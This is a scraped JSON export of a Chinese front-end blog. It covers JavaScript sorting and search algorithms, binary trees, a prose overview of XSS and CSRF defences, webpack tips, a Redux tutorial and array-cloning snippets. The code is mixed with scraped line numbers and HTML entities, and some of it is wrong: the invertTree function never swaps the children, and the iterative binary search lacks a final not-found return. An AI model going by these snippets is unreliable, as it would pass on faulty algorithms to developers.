比较两个相邻的项，如果第一个大于第二个则交换他们的位置,元素项向上移动至正确的顺序，就好像气泡往上冒一样冒泡demo:function bubbleSort(arr) &#123; let len = arr.length; for (let i = 0; i &lt; len; i++) &#123; for (let j = 0; j &lt; len - 1 - i; j++) &#123; if (arr[j] &gt; arr[j+1]) &#123; //相邻元素两两对比 [arr[j + 1], arr[j]] = [arr[j], arr[j + 1]]; &#125; &#125; &#125; return arr;&#125;// 1) 首先，在数组中选择一个中间项作为主元// 2) 创建两个指针，左边的指向数组第一个项，右边的指向最后一个项，移动左指针，直到找到一个比主元大的项，接着，移动右边的指针，直到找到一个比主元小的项，然后交换它们。重复这个过程，直到// 左侧的指针超过了右侧的指针。这个使比主元小的都在左侧，比主元大的都在右侧。这一步叫划分操作// 3) 接着，算法对划分后的小数组（较主元小的值组成的的小数组， 以及较主元大的值组成的小数组）重复之前的两个步骤，直到排序完成快排demo:function quickSort(arr, left, right) &#123; let len = arr.length; let partitionIndex; left = typeof left !== 'number' ? 0 : left; right = typeof right !== 'number' ? len - 1 : right; if (left &lt; right) &#123; partitionIndex = partition(arr, left, right); quickSort(arr, left, partitionIndex - 1); quickSort(arr, partitionIndex + 1, right); &#125; return arr;&#125;function partition(arr, left, right) &#123; //分区操作 let pivot = left; //设定基准值（pivot） let index = pivot + 1; for (let i = index; i &lt;= right; i++) &#123; if (arr[i] &lt; arr[pivot]) &#123; [arr[i], arr[index]] = [arr[index], arr[i]]; index++; &#125; &#125; [arr[pivot], arr[index - 1]] = [arr[index - 1], arr[pivot]]; return index - 1;&#125;// 选择排序：大概思路是找到最小的放在第一位，找到第二小的放在第二位，以此类推 算法复杂度O(n^2)选择demo:function selectionSort(arr) &#123; let len = arr.length; let minIndex; for (let i = 0; i &lt; len - 1; i++) &#123; minIndex = i; for (let j = i + 1; j &lt; len; j++) &#123; if (arr[j] &lt; arr[minIndex]) &#123; //寻找最小的数 minIndex = j; //将最小数的索引保存 &#125; &#125; [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]]; &#125;return arr;&#125;// 插入排序：每次排一个数组项，假设数组的第一项已经排序，接着，把第二项与第一项进行对比，第二项是该插入到第一项之前还是之后，第三项是该插入到第一项之前还是第一项之后还是第三项插入demo:function insertionSort(arr) &#123; let len = arr.length; let preIndex, current; for (let i = 1; i &lt; len; i++) &#123; preIndex = i - 1; current = arr[i]; while (preIndex &gt;= 0 &amp;&amp; arr[preIndex] &gt; current) &#123; arr[preIndex + 1] = arr[preIndex]; preIndex--; &#125; arr[preIndex + 1] = current; &#125; return arr;&#125;// 归并排序：Mozilla Firefox 使用归并排序作为Array.prototype.sort的实现，而chrome使用快速排序的一个变体实现的,前面三种算法性能不好，但归并排序性能不错 算法复杂度O(nlog^n)// 归并排序是一种分治算法。本质上就是把一个原始数组切分成较小的数组，直到每个小数组只有一个位置，接着把小数组归并成较大的数组，在归并过程中也会完成排序，直到最后只有一个排序完毕的大数组归并demo:function mergeSort(arr) &#123; //采用自上而下的递归方法 let len = arr.length; if(len &lt; 2) &#123; return arr; &#125; let middle = Math.floor(len / 2), left = arr.slice(0, middle), right = arr.slice(middle); return merge(mergeSort(left), mergeSort(right));&#125;function merge(left, right)&#123; let result = []; while (left.length &amp;&amp; right.length) &#123; if (left[0] &lt;= right[0]) &#123; result.push(left.shift()); &#125; else &#123; result.push(right.shift()); &#125; &#125; result.push(...left); result.push(...right); return result;&#125;//堆排序：堆排序把数组当中二叉树来排序而得名。// 1）索引0是树的根节点；2）除根节点为，任意节点N的父节点是N/2；3）节点L的左子节点是2*L；4）节点R的右子节点为2*R + 1// 本质上就是先构建二叉树，然后把根节点与最后一个进行交换，然后对剩下对元素进行二叉树构建，进行交换，直到剩下最后一个堆demo:var len; //因为声明的多个函数都需要数据长度，所以把len设置成为全局变量function buildMaxHeap(arr) &#123; //建立大顶堆 len = arr.length; for (let i = Math.floor(len / 2); i &gt;= 0; i--) &#123; heapify(arr, i); &#125;&#125;function heapify(arr, i) &#123; //堆调整 let left = 2 * i + 1; let right = 2 * i + 2; let largest = i; if (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123; largest = left; &#125; if (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123; largest = right; &#125; if (largest !== i) &#123; [arr[i], arr[largest]] = [arr[largest], arr[i]]; heapify(arr, largest); &#125;&#125;function heapSort(arr) &#123; buildMaxHeap(arr); for (let i = arr.length - 1; i &gt; 0; i--) &#123; [arr[0],arr[i]]=[arr[i],arr[0]]; len--; heapify(arr, 0); &#125; return arr;&#125; 二分查找思路（1）首先，从有序数组的中间的元素开始搜索，如果该元素正好是目标元素（即要查找的元素），则搜索过程结束，否则进行下一步。（2）如果目标元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半区域查找，然后重复第一步的操作。（3）如果某一步数组为空，则表示找不到目标元素。1234567891011121314151617181920212223242526272829303132333435// 非递归算法function binary_search(arr, key) &#123; let low = 0; let high = arr.length - 1; while(low &lt;= high)&#123; let mid = parseInt((high + low) / 2); if(key === arr[mid])&#123; return mid; &#125;else if(key &gt; arr[mid])&#123; low = mid + 1; &#125;else if(key &lt; arr[mid])&#123; high = mid -1; &#125;else&#123; return -1; &#125; &#125;&#125; // 递归算法function binary_search(arr,low, high, key) &#123; if (low &gt; high)&#123; return -1; &#125; let mid = parseInt((high + low) / 2); if(arr[mid] === key)&#123; return mid; &#125;else if (arr[mid] &gt; key)&#123; high = mid - 1; return binary_search(arr, low, high, key); &#125;else if (arr[mid] &lt; key)&#123; low = mid + 1; return binary_search(arr, low, high, key); &#125;&#125;; 二叉树相关12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849创建function Node(data,left,right)&#123; this.data = data;//数值 this.left = left;//左节点 this.right = right;//右节点&#125;;插入二叉树function insert(node,data)&#123; //创建一个新的节点 let newNode = new Node(data,null,null); //判断是否存在根节点，没有将新节点存入 if(node == null)&#123; node = newNode; &#125;else&#123; //获取根节点 let current = node; let parent; while(true)&#123; //将当前节点保存为父节点 parent = current; //将小的数据放在左节点 if(data &lt; current.data)&#123; //获取当前节点的左节点 //判断当前节点下的左节点是否有数据 current = current.left; if(current == null)&#123; //如果没有数据将新节点存入当前节点下的左节点 parent.left = newNode; break; &#125; &#125;else&#123; current = current.right; if(current == null)&#123; parent.right = newNode; break; &#125; &#125; &#125; &#125;&#125;翻转二叉树function invertTree(node) &#123; if (node !== null) &#123; node.left, node.right = node.left, node.right; invertTree(node.left); invertTree(node.right); &#125; return node;&#125; 1234查找链表中倒数第k个结点2个思路1：先遍历出长度，然后查找长度-k+1的值2：2个指针，一个指针先走k-1，然后两个一起走到底部，后者就是结果 网络安全相关XSS CSRFXSS(跨站脚本攻击)，恶意的注入html代码，其他用户访问时，会被执行特点：能注入恶意的HTML/JavaScript代码到用户浏览的网页上，从而达到Cookie资料窃取、会话劫持、钓鱼欺骗等攻击防御手段： 浏览器禁止页面的JS访问带有HttpOnly属性的Cookie 两端进行输入格式检查 通过编码转义的方式进行输出检查CSRF(攻击跨站请求伪造)特点：重要操作的所有参数都是可以被攻击者猜测到的。攻击者预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求。防御手段： token验证机制，比如请求数据字段中添加一个token，响应请求时校验其有效性 用户操作限制，比如验证码（繁琐，用户体验差） 请求来源限制，比如限制HTTP Referer才能完成操作（防御效果相比较差）实践中常用第一种 webpack相关#####打包体积优化思路 提取第三方库或通过引用外部文件的方式引入第三方库 代码压缩插件UglifyJsPlugin 服务器启用gzip压缩 按需加载资源文件 require.ensure 优化devtool中的source-map 剥离css文件，单独打包 去除不必要插件，通常就是开发环境与生产环境用同一套配置文件导致#####打包效率 开发环境采用增量构建，启用热更新 开发环境不做无意义的工作如提取css计算文件hash等 配置devtool 选择合适的loader 个别loader开启cache 如babel-loader 第三方库采用引入方式 提取公共代码 优化构建时的搜索路径 指明需要构建目录及不需要构建目录 模块化引入需要的部分Loader编写一个loader123456789101112131415161718loader就是一个node模块，它输出了一个函数。当某种资源需要用这个loader转换时，这个函数会被调用。并且，这个函数可以通过提供给它的this上下文访问Loader API。reverse-txt-loader定义module.exports = function(src) &#123; //src是原文件内容（abcde），下面对内容进行处理，这里是反转 var result = src.split('').reverse().join(''); //返回JavaScript源码，必须是String或者Buffer return `module.exports = '$&#123;result&#125;'`;&#125;使用&#123; test: /\\.txt$/, use: [ &#123; './path/reverse-txt-loader' &#125; ]&#125;, plugins使用范围更广，通常只需要require()然后添加到plugins数组中，且需要new一个 其他URL到界面显示发生了什么 DNS解析先本地缓存找，在一层层找将常见的地址解析成唯一对应的ip地址基本顺序为：本地域名服务器-&gt;根域名服务器-&gt;com顶级域名服务器依次类推下去,找到后记录并缓存下来如www.google.com为. -&gt; .com -&gt; google.com. -&gt; www.google.com. TCP连接三次握手，只要没收到确认消息就要重新发 主机向服务器发送一个建立连接的请求（您好，我想认识您）； 服务器接到请求后发送同意连接的信号（好的，很高兴认识您）； 主机接到同意连接的信号后，再次向服务器发送了确认信号（我也很高兴认识您），自此，主机与服务器两者建立了连接。 发送HTTP请求浏览器会分析这个url，并设置好请求报文发出。请求报文中包括请求行、请求头、空行、请求主体。https默认请求端口443， http默认80。常见的http请求如下1234567891011121314POST / HTTP1.1Host:www.wrox.comUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)Content-Type:application/x-www-form-urlencodedContent-Length:40Connection: Keep-Alivename=Professional%20Ajax&amp;publisher=Wiley第一部分：请求行，第一行说明是post请求，以及http1.1版本。第二部分：请求头部，第二行至第六行。第三部分：空行，第七行的空行。第四部分：请求数据，第八行。4. 服务器处理请求并返回HTTP报文后端处理返回http报文如下 12345678910111213141516HTTP/1.1 200 OKDate: Fri, 22 May 2009 06:07:21 GMTContent-Type: text/html; charset=UTF-8&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;!--body goes here--&gt; &lt;/body&gt;&lt;/html&gt;第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）第二行和第三行为消息报头，Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8第三部分：空行，消息报头后面的空行是必须的第四部分：响应正文，服务器返回给客户端的文本信息。空行后面的html部分为响应正文。 浏览器解析渲染页面 通过HTML解析器解析HTML文档，构建一个DOM Tree，同时通过CSS解析器解析HTML中存在的CSS，构建Style Rules，两者结合形成一个Attachment。 通过Attachment构造出一个呈现树（Render Tree） Render Tree构建完毕，进入到布局阶段（layout/reflow），将会为每个阶段分配一个应出现在屏幕上的确切坐标。 最后将全部的节点遍历绘制出来后，一个页面就展现出来了。遇到script会停下来执行，所以通常把script放在底部 连接结束 组件封装目的：为了重用，提高开发效率和代码质量注意：低耦合，单一职责，可复用性，可维护性常用操作： 分析布局 初步开发 化繁为简 组件抽象 JS异步加载 动态生成script标签 添加h5的async defer属性，前者乱序不适合依赖性加载 async 是“下载完就执行”， defer 是“渲染完再执行” css与js动画差异 css性能好 css代码逻辑相对简单 js动画控制好 js兼容性好 js可实现的动画多 js可以添加事件 负载均衡多台服务器共同协作，不让其中某一台或几台超额工作，发挥服务器的最大作用 http重定向负载均衡：调度者根据策略选择服务器以302响应请求，缺点只有第一次有效果，后续操作维持在该服务器 dns负载均衡：解析域名时，访问多个ip服务器中的一个（可监控性较弱） 反向代理负载均衡：访问统一的服务器，由服务器进行调度访问实际的某个服务器，对统一的服务器要求大，性能受到 服务器群的数量 CDN内容分发网络，基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。 内存泄漏定义：程序中己动态分配的堆内存由于某种原因程序未释放或无法释放引发的各种问题js中可能出现的内存泄漏情况结果：变慢，崩溃，延迟大等原因： 全局变量 dom清空时，还存在引用 ie中使用闭包 定时器未清理 子元素存在引起的内存泄露 避免策略： 减少不必要的全局变量，或者生命周期较长的对象，及时对无用的数据进行垃圾回收； 注意程序逻辑，避免“死循环”之类的 ； 避免创建过多的对象 原则：不用了的东西要及时归还。 减少层级过多的引用babel原理ES6、7代码输入 -&gt; babylon进行解析 -&gt; 得到AST（抽象语法树）-&gt; plugin用babel-traverse对AST树进行遍历转译 -&gt;得到新的AST树-&gt;用babel-generator通过AST树生成ES5代码、 promise特性：Promise 对象的错误具有冒泡性质，会一直向后传递，直到被捕获为止，也即是说，错误总会被下一个catch语句捕获 js自定义事件三要素：document.createEvent()event.initEvent()element.dispatchEvent()1234567891011121314151617181920212223242526272829demo:(en:自定义事件名称，fn:事件处理函数，addEvent:为DOM元素添加自定义事件，triggerEvent:触发自定义事件)window.onload = function()&#123; var demo = document.getElementById(\"demo\"); demo.addEvent(\"test\",function()&#123;console.log(\"handler1\")&#125;); demo.addEvent(\"test\",function()&#123;console.log(\"handler2\")&#125;); demo.onclick = function()&#123; this.triggerEvent(\"test\"); &#125;&#125;Element.prototype.addEvent = function(en,fn)&#123; this.pools = this.pools || &#123;&#125;; if(en in this.pools)&#123; this.pools[en].push(fn); &#125;else&#123; this.pools[en] = []; this.pools[en].push(fn); &#125;&#125;Element.prototype.triggerEvent = function(en)&#123; if(en in this.pools)&#123; var fns = this.pools[en]; for(var i=0,il=fns.length;i&lt;il;i++)&#123; fns[i](); &#125; &#125;else&#123; return; &#125;&#125; es6模块 commonjs amd cmd CommonJS 的规范中，每个 JavaScript 文件就是一个独立的模块上下文（module context），在这个上下文中默认创建的属性都是私有的。也就是说，在一个文件定义的变量（还包括函数和类），都是私有的，对其他文件是不可见的。 CommonJS是同步加载模块,在浏览器中会出现堵塞情况，所以不适用 AMD 异步，需要定义回调define方式 es6 一个模块就是一个独立的文件，该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量 es6还可以导出类、方法，自动适用严格模式 前后端路由差别1.后端每次路由请求都是重新访问服务器2.前端路由实际上只是JS根据URL来操作DOM元素，根据每个页面需要的去服务端请求数据，返回数据后和模板进行组合。","categories":[{"name":"前端周刊","slug":"前端周刊","permalink":"https://ru23.com/categories/前端周刊/"}],"tags":[{"name":"前端分享","slug":"前端分享","permalink":"https://ru23.com/tags/前端分享/"}]},{"title":"redux入门","slug":"2018-09-redux入门","date":"2018-09-28T11:43:17.000Z","updated":"2018-10-24T03:46:02.632Z","comments":true,"path":"note/c5bbc436.html","link":"","permalink":"https://ru23.com/note/c5bbc436.html","excerpt":"","text":"Redux由Flux演变而来，提供几个简单的API来实现状态管理，所谓状态指的是应用数据，所以，Redux本质上是用来管理数据的。进一步，Redux配合支持数据绑定的视图库使用，就可以将应用状态和视图一一对应，开发者不需要再去关心DOM操作，只关心如何组织数据即可。 由于Redux对于数据的管理拆分很细，一时间会有很多概念，并且Redux有自己丰富的生态，所以容易眼花缭乱。所以强烈建议从头开始一步一步的来，深入体验并理解Redux的思想，不要步子迈太大。✦ 不要一开始过多的纠结代码放在哪个目录✦ 不要一开始就想对action和reducer的代码做精简✦ 不要一开始就考虑数据缓存，离线数据等问题✦ 不要一开始就过度设计数据，考虑数据扁平化的问题反正一句话，饭要一口一口的吃，路要一步一步的走，Redux对于状态管理的东西拆得太细，需要多花一些时间去体会。 Redux是什么？Redux其实很简单，总结起来就三句话：✦ 将整个应用的state储存在唯一的store对象中。✦ state只能通过触发action来修改，其中action就是一个描述性的普通对象。✦ 使用reducer来描述action如何改变state。 是的，简而言之就是：Redux让应用的数据被集中管理，并且只能通过触发action的方式来修改，而具体如何修改state，是由reducer来决定的。 那么问题来了：✦ store是什么鬼？✦ action是什么鬼？✦ reducer是什么鬼?✦ 最重要的是，为啥要使用Redux，它能给我们带什么什么好处？或者说，引入这么一个状态理器到底有啥用？ 接下来，我们先捉这三只鬼。 store是什么鬼？前面提过，Redux的目的就是为了对应用数据进行集中管理，也就是state，而state是个普通对象。为了防止state被不小心更新，Redux创建了store对象，专门用来管理state数据。 所以，store就是state的守门员，管理并维护应用数据。 创建store我们通过createStore(reducer, [initialState], enhancer)的方式来创建store。需要注意的是，应用中应该有且只有一个store。12345678910111213141516171819202122232425262728293031import &#123; createStore &#125; from 'redux'// 这是reducer，后文会详细介绍function todos(state = [], action) &#123; switch (action.type) &#123; case 'ADD_TODO': return state.concat([ action.text ]) default: return state &#125;&#125;// 创建store，并且给state一个初始值['HTML']let store = createStore(todos, [ 'HTML' ])// state.dispatch()，最常用的API// 修改state的唯一方式就是调用store.dispatch()方法// 显然，其中的描述性对象// &#123;// type: 'ADD_TODO',// text: 'CSS'// &#125;// 就是actionstore.dispatch(&#123; type: 'ADD_TODO', text: 'CSS'&#125;)// store.getState()，另一个常用的API// 用来获取state的值console.log(store.getState()); // [ 'HTML', 'CSS' ] store的API们store的API很简单，这儿我按重要顺序列出所有的API，主要记住前两个。✦ dispatch(action)：触发action，再次声明，这是改变state的唯一方式，请默念两次✦ getState()：获取当前的state✦ subscribe(listener)：注册一个监听函数，state发生变化时触发✦ replaceReducer(nextReducer)：替换reducer，用得较少 总结一下，store提供了简单的API，用来管理应用内的数据，它限制了只能通过dispatch(action)来修改state，那么这个action是什么呢？ action是什么鬼？前文提过，action就是一个描述性的普通对象，所以它非常简单！说白了，就是一坨数据，然后这坨数据有名字。 actionaction是一个描述性的普通对象。推荐如下的action结构，type是action的名称，payload是附带的数据。12345678&#123; // 显然，这个名字取得很浅显易懂 type: UPDATE_ARTICLES_LIST, payload: &#123; articles: articles, lastkey: lastkey &#125;&#125; 值得注意的是：实际项目中，我们应该尽量减少action中附带的数据，比如想要更新某篇文章的标题，我们只需要携带文章id和文章新标题即可，而不需要携带整个新文章字段。为了让action更便于维护，我们通常使用action creator而不是action。 action creatoraction create就是一个简单的函数，直接将action作为返回值。12345678910111213141516171819202122232425262728// action creator，返回一个action// 除此之外，没有其他的动作function updateArticlesList(normalizeData, lastkey) &#123; return &#123; type: UPDATE_ARTICLES_LIST, payload: &#123; normalizeData: normalizeData, listLastkey: lastkey &#125; &#125;&#125;// 通过dispatch触发一个action，这是我们修改state的唯一方式dispatch(updateArticlesList( normalizeData, lastkey));// 将dispatch(action)整个动作取个别名，方便调用const updatePosts = (normalizeData, lastkey) =&gt; &#123; return dispatch(updateArticlesList( normalizeData, lastkey ));&#125;updatePosts(...); 那么为什么需要action creatore呢？试想一个场景，我们有好几处dispatch(action)，现在突然想要修改这个action的定义，那么我们需要修改所有地方，代码也比较冗余!而使用action creator，相当于对action做了简单的封装，避免了这些问题。既灵活又便于维护！ 异步action creator我们已经知道，修改state的唯一方式就是触发action，也就是dispatch(action)。但是如果是异步操作，比如一个网络请求，我们需要等到请求返回之后才会返回action，怎么办呢？123456789function updateArticlesList() &#123; return GET(url).then(function(res) &#123; // 难道直接return action？ // 显然是不行的，这儿的返回值并不是updateArticlesList函数的返回值 return action; &#125;).catch(function(err) &#123; console.log(err); &#125;);&#125; 对于异步场景，我们的解决方案是返回函数而不是直接返回action。就像下面这样。为了让dispatch方法可以接受函数作为参数，我们需要使用redux-thunk这个中间件。 1234567import thunk from 'redux-thunk';import &#123; rootReducer &#125; from './reducer.js';const store = createStore( rootReducer, applyMiddleware(thunk)); 然后你就可以dispatch一个函数了12345678910111213function fetchArticlesList() &#123; // 传入dispatch/getstate，当然是为了获取state以及更新state return (dispatch, getState) =&gt; &#123; return GET(url).then(function(res) &#123; dispatch(updateArticlesList( normalizeData, lastkey )); &#125;).catch(function(err) &#123; console.log(err); &#125;); &#125;&#125; 看起来有点迷糊？其实就是把异步请求抽象成action creator，然后放到了redux的代码中。试想一下，如果没有这种方式，你会怎么去处理异步请求？是不是会在组件或者页面中去发异步请求，然后在回调函数中dispatch(action)更新state。本质上也没太大区别。但是好处却是很明显的。 稍微提一下，如果我们可以使用async/await的话，异步action creator可以长得和同步action creator差不多。 action就是一坨数据，它并没有告诉Redux应该怎么去更新state，接下来介绍的reducer就是负责如何更新state这个工作的。 reducer是什么鬼？action本身没有任何意义，就是一个描述性的普通对象。它并没有说明这个数据应该如何更新state。具体如何更新state，是由reducer决定的。reducer的核心就一行代码：(state, action) =&gt; newstate12345678910111213141516171819202122232425262728293031// ------------------------------------// Action Handlers// ------------------------------------const ACTION_HANDLERS = &#123; [UPDATE_ARTICLES_DETAIL]: (articles, action) =&gt; articles, [UPDATE_ARTICLES_LIST]: (articles, action) =&gt; &#123; let payload = action.payload, normalizeData = payload.normalizeData, list = articles.list.concat(normalizeData.result), listLastkey = payload.listLastkey; // 更新articles.list字段和articles.lastkey字段 // 这儿为什么不是state，而是articles呢？留着后文介绍 return updateObject(articles, &#123; list, listLastkey &#125;); &#125;&#125;// ------------------------------------// Reducer// ------------------------------------export function articlesReducer(articles = &#123; list: [], listLastkey: 0&#125;, action) &#123; const handler = ACTION_HANDLERS[action.type] return handler ? handler(articles, action) : articles&#125; reducer函数应该是纯函数，它要保证：只要传入参数相同，那么返回的新state就一定相同。所以永远不要再reducer中做如下操作：✦ 修改传入的state参数✦ 执行有副作用的操作，比如API请求，路由跳转等✦ 调用非纯函数，比如Math.random()或Date.now() 而一旦state变得复杂、层级较多的时候，如何设计reducer就是一个比较复杂的话题了。关于如何设计state？如何分拆reducer？reducer之间如何共享数据？以及如何重构reducer的代码？可以移步另一篇博客：如何最佳实践的设计reducer。 那么，回到最初的话题，引入Redux到我们的应用中，到底有什么好处？我们为什么需要一个专门的状态管理器？ 为啥要使用redux？早些时候，前端并没有这么复杂，几乎不怎么涉及数据管理。随着前端的发展，前端也开始引入MVC之类的架构，对数据、视图、逻辑进行拆分处理。为了保持数据和视图的同步，我们会频繁的操作DOM元素。简直是噩梦。而后KnockoutJS，angularJS等出现了，他们都支持数据绑定，终于让开发可以不在频繁的操作DOM，而是仅仅修改数据，然后自动同步到view。但这还不够彻底，数据仍然是分散的。我们会在controller中写很多操作数据、操作视图的代码，甚至存在冗余数据，想要修改、更新、同步的话，有很大的隐患。Redux的出现，提供了对数据的集中管理，让单向数据流成为了可能。另外，Redux还让前后端彻底分离变成了可能，这一点也有极大的意义。 Redux的数据流Redux通过一些限制告诉你：数据只能保存在我这儿，别想太分散！想要修改数据？告诉我一个带新数据的action，我会通过reducer自动修改，然后返回修改后的数据给你！是的，redux很想“数据库”，数据被集中存储，并且只能通过“预先定义的action操作”来修改。 更厉害的是，配上支持数据绑定的视图库，你会发现一个神奇的事情：之前我们是面向view和controller编程，随着项目的复杂，代码会彼此影响而且数据会分散到各处。而引入redux之后，我们单纯的面向数据编程即可，我们在Redux中统一的管理数据，然后数据变换会反映到view上，而数据上的交互，本质上也是触发了Redux中的action。如下图 Redux数据流所以，设计redux程序的时候，提前想清楚state的结构尤其重要，就好比设计数据库表结构之于后台。 服务器渲染让前后端彻底分离成为了可能上图也可以看出，Redux构建出一份单向数据流。这让服务端渲染变成了可能，而这个特性，让前后端彻底分离变成了可能，还不用担心SEO的问题。想当初，为了解决前后端分离的问题，大家费尽心思，奈何进展甚微，淘宝甚至提出中途岛midway项目，通过中间搭建由前端维护的Nodejs服务器来实现简单的渲染然后返回HTML，但其实这个Nodejs服务器一点都不简单，需要考虑太多东西，比如安全、性能、缓存等。 总结Redux主要用于对数据进行集中管理，并且让整个应用的数据流变得清晰。让应用开发更流畅，数据管理更有效。有了Redux，开发者们慢慢的转化为面向数据编程，而不再是频繁的操作DOM，维护越来越复杂的controller逻辑。简单来说，Redux的东西不多，更重要的是理解它的思路：✦ 将整个应用的state储存在唯一的store对象中。✦ state只能通过触发action来修改，其中action就是一个描述性的普通对象。✦ 使用reducer来描述action如何改变state。✦ Redux的单向数据流，可以实现服务端渲染，让前后端彻底分离成为可能，这个有里程碑的意义。✦ Redux非常适合复杂的应用，尤其是多交互、多数据源的应用。 还是那句话，Redux将数据管理拆得很细，所以会有很多新东西去了解，但其实只要了解它的思想，其他的就很顺其自然了。 作者：齐修_qixiuss链接：https://www.jianshu.com/p/d296a8c34936來源：简书简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"Module not found: Error: Cannot resolve module 'fs' in","slug":"2018-03-Module-not-found-Error-Cannot-resolve-module-fs-in","date":"2018-09-22T10:32:13.000Z","updated":"2018-10-24T03:46:02.417Z","comments":true,"path":"note/9782d4af.html","link":"","permalink":"https://ru23.com/note/9782d4af.html","excerpt":"","text":"控制台报错：123456789However I see this error./~/adal-node/lib/util.jsModule not found: Error: Cannot resolve module 'fs' in /Users/luis.valencia/Documents/GraphSamples/Sample1/node_modules/adal-node/libresolve module fs in /Users/luis.valencia/Documents/GraphSamples/Sample1/node_modules/adal-node/lib looking for modules in /Users/luis.valencia/Documents/GraphSamples/Sample1/node_modules/adal-node/lib /Users/luis.valencia/Documents/GraphSamples/Sample1/node_modules/adal-node/lib/fs doesn't exist (module as directory) resolve 'file' fs in /Users/luis.valencia/Documents/GraphSamples/Sample1/node_modules/adal-node/lib resolve file 解决方案： add this to webpack.config.js1target: 'node', 原文：https://stackoverflow.com/questions/40541044/module-not-found-error-cannot-resolve-module-fs-in","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://ru23.com/tags/npm/"}]},{"title":"JS 数组克隆方法总结","slug":"2018-09-JS-数组克隆方法总结","date":"2018-09-21T11:22:37.000Z","updated":"2018-10-24T03:46:02.616Z","comments":true,"path":"note/207f8587.html","link":"","permalink":"https://ru23.com/note/207f8587.html","excerpt":"","text":"ES5 方法总结slice12345let arr = [2,4,434,43]let arr1= arr.slice()arr[0] = 'a'console.log(arr,arr1) // [ 2, 4, 434, 43 ]console.log(arr1 === arr) // false 遍历数组1234567891011Array.prototype.clone = function()&#123; let a=[]; for(let i=0,l=this.length;i&lt;l;i++) &#123; a.push(this[i]); &#125; return a;&#125;let arr = ['aaa','bbb','ccc','wwwww','ddd']let arr2 = arr.clone()console.log(arr2)console.log( arr2 === arr ) concat()12345678Array.prototype.clone=function()&#123; return [].concat(this); //或者 return this.concat();&#125;let arr = ['aaa','asss']let arr1 = arr.clone()arr[0] = 123console.log(arr,arr1) ES6 方法总结Object.assign() 浅复制，也可以实现数组的克隆12345let arr = ['sdsd',123,123,123]let arr1 = []Object.assign(arr1,arr)arr[1] = 'aaaa'console.log(arr,arr1) // [ 'sdsd', 'aaaa', 123, 123 ] [ 'sdsd', 123, 123, 123 ] 扩展运算符12345const a1 = [1, 2];// 写法一const a2 = [...a1];a1[0] = 'aaa'console.log(a1,a2)","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"js代码片段","slug":"js代码片段","permalink":"https://ru23.com/tags/js代码片段/"}]},{"title":"前端周刊-2018年09月第3周","slug":"2018-09-前端周刊-2018年09月第3周","date":"2018-09-21T08:24:00.000Z","updated":"2018-10-24T03:46:03.321Z","comments":true,"path":"note/cb1c5a03.html","link":"","permalink":"https://ru23.com/note/cb1c5a03.html","excerpt":"","text":"编写「可读」代码的实践链接:http://taobaofed.org/blog/2017/01/05/writing-readable-code/ 摘要伟大的文学作品都是建立在废纸堆上的，不断删改作品的过程有助于写作者培养良好的「语感」。当然，代码毕竟不是艺术品，程序员没有精力也不一定有必要像作家一样反复打磨自己的代码/作品。但是，如果我们能够在编写代码时稍稍多考虑一下实现的合理性，或者在添加新功能的时候稍稍回顾一下之前的实现，我们就能够培养出一些「代码语感」。这种「代码语感」会非常有助于我们写出高质量的可读的代码。 React + Redux 组件化方案链接:http://imweb.io/topic/57c531bc6227a4f55a8872c2 摘要组件化方案:理想中的组件化，第一步应该就是组件的标签化， 例如有一个 Header 组件，无需关注组件内部的实现，我们只需要使用一个 标签就能调用它，通过设置属性的方式，来控制它的显示的内容，和对应的事件。借助 jsx 语法，React 已经实现上述想法。但是由于 React 的数据流向是单向的， 子组件的数据和方法只能由父级组件赋予，一旦组件嵌套层次变深，传递数据将会变得非常复杂。redux 框架解决了这个问题，简单来说，它将 react 由父级传递数据，变为了由一个统一的数据源 store 单向地向各个组件传递数据。所有数据都存放在 store 中，组件内部不维护任何数据。 store 提供了 dispatch 方法来触发改变 store 中数据。 dispatch 传入的值被称作 action。 dispatch(action) 之后，会进入到 store 中称为 reducer 的处理函数，这些 reducer 会依据不同的 action 的类型，进行不同的处理，reducer 返回的值就会作为 store 中新的数据，一个 reducer 对应的是 store 中一个数据字段，每多一个reducer， store 中就多一个数据字段。数据发生改变后， store 就会通知对应的组件重新渲染。 通过 redux 框架提供的 connect 高阶函数， 直接从 store 选取需要的数据和申明需要使用的方法传入组件中，这些申明的方法是组件事件具体的逻辑的实现，例如发送请求，上报逻辑等等，所以通常调用 dispatch(action) 的逻辑也会包含在里面。 ANT DESIGN PRO-开箱即用的中台前端/设计解决方案链接:https://github.com/ant-design/ant-design-pro?utm_source=gold_browser_extension 摘要💎 优雅美观：基于 Ant Design 体系精心设计；📐 常见设计模式：提炼自中后台应用的典型页面和场景；🚀 最新技术栈：使用 React/dva/antd 等前端前沿技术开发；📱 响应式：针对不同屏幕大小设计；🎨 主题：可配置的主题满足多样化的品牌诉求；🌐 国际化：内建业界通用的国际化方案；⚙️ 最佳实践：良好的工程实践助您持续产出高质量代码；🔢 Mock 数据：实用的本地数据调试方案；✅ UI 测试：自动化测试保障前端产品质量； 实现一个完美符合Promise/A+规范的Promise链接:https://github.com/forthealllight/blog/issues/4 摘要Promise允许我们通过链式调用的方式来解决“回调地狱”的问题，特别是在异步过程中，通过Promise可以保证代码的整洁性和可读性。本文主要解读Promise/A+规范，并在此规范的基础上，自己实现一个Promise. 